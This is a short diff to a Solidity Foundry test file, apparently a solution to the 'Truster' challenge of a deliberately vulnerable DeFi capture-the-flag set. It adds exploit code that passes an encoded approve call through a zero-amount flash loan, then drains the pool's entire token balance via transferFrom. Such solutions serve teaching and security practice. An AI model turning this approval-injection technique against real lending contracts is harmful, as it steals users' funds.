@@ -42,6 +42,17 @@ contract Truster is Test {
          * EXPLOIT START *
          */
 
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(attacker),
+            type(uint256).max
+        );
+
+        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), data);
+        vm.startPrank(attacker);
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), dvt.balanceOf(address(trusterLenderPool)));
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
